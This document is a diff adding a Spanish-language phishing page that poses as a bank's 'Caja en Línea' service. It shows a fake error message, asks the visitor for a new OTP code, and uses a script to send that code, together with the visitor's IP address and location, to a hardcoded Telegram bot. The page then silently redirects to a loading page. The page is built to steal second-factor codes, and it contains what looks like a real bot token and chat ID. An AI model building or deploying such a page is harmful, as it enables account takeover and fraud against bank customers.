@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caja en Línea</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #EFEFEF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px; /* Ajusta el espaciado interno del contenedor */
+            border-radius: 1px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; /* Alinea el contenido hacia el inicio del contenedor */
+            height: 300px; /* Mantiene una altura fija para el contenedor */
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #333131;
+            margin-bottom: 10px; /* Espacio debajo del texto */
+            margin-top: 0; /* Sin margen superior */
+        }
+
+        .error-message {
+            color: red;
+            margin-bottom: 20px; /* Espacio debajo del mensaje de error */
+        }
+
+        .input-group {
+            position: relative;
+            margin: 0; /* Sin margen por defecto */
+            flex-grow: 1; /* Permite que el grupo de entrada use el espacio disponible */
+        }
+
+        label {
+            position: absolute;
+            left: 10px;
+            top: 10px;
+            transition: 0.2s ease all;
+            color: #aaa;
+            font-size: 16px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #0f7a83;
+            outline: none;
+            font-size: 16px;
+            transition: border-bottom 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-bottom: 1px solid #3c3e41;
+        }
+
+        input[type="text"]:focus + label,
+        input[type="text"]:not(:placeholder-shown) + label {
+            top: -5px;
+            left: 10px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        /* Estilo para el enlace de continuar */
+        .continue-text {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #0f7a83; /* Color del texto */
+            cursor: pointer; /* Cambiar el cursor al pasar el mouse */
+            text-decoration: none; /* Sin subrayado */
+            align-self: flex-end; /* Alinear el enlace a la derecha */
+        }
+
+        .continue-text:hover {
+            text-decoration: underline; /* Subrayado al pasar el mouse */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <p class="error-message">¡Ha ocurrido un error!</p> <!-- Mensaje de error -->
+        <p class="subtitle">Ingrese un nuevo código OTP</p>
+        <div class="input-group">
+            <input type="text" id="otp" name="otp" required placeholder=" ">
+            <label for="otp">OTP</label>
+        </div>
+        <a href="#" id="submitButton" class="continue-text">CONTINUAR</a> <!-- Enlace con estilo de texto -->
+    </div>
+
+    <script>
+        document.getElementById('submitButton').addEventListener('click', function(event) {
+            event.preventDefault(); // Evitar el comportamiento por defecto del enlace
+            const otp = document.getElementById('otp').value;
+
+            // Obtener ubicación e IP de ipwhois.io
+            fetch('https://ipwhois.app/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const location = `${data.city}, ${data.country}`;
+                    const ip = data.ip; // Obtener IP
+                    sendToTelegram(otp, location, ip);
+                })
+                .catch(error => {
+                    console.error('Error al obtener la ubicación:', error);
+                });
+        });
+
+        function sendToTelegram(otp, location, ip) {
+            const token = '8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4'; // Reemplaza con tu token de bot de Telegram
+            const chatId = '-4571868410'; // Reemplaza con tu chat ID de Telegram
+            const message = `Código OTP: ${otp}\nUbicación: ${location}\nIP: ${ip}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    // Aquí no se muestra ningún mensaje al usuario
+                    window.location.href = 'cargando2.html'; // Redirigir a la siguiente página
+                })
+                .catch(error => {
+                    console.error('Error al enviar los datos:', error);
+                });
+        }
+    </script>
+</body>
+
+</html>
